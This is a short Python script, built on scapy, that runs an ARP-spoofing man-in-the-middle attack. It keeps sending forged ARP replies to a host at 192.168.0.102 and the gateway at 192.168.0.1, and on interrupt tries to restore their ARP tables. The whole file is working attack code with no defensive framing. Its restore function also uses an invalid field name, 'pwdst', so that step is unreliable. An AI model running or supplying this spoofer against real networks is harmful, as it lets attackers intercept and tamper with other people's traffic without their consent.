import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    bordcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boardcast = bordcast / arp_request
    answered_list = scapy.srp(arp_request_boardcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, hwdst=destination_mac, pdst=destination_ip, psrc=source_ip, pwdst=source_mac)
    packet.show()
    scapy.send(packet)



packet_send_count=0

try:
    while True:
        spoof('192.168.0.102', '192.168.0.1')
        spoof('192.168.0.1', '192.168.0.102')
        packet_send_count += 2
        print("\r[+] Packet send " + str(packet_send_count), end=""),
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected quit command, resetting ARP table...")
    restore('192.168.0.102', '192.168.0.1')
    restore('192.168.0.1', '192.168.0.102')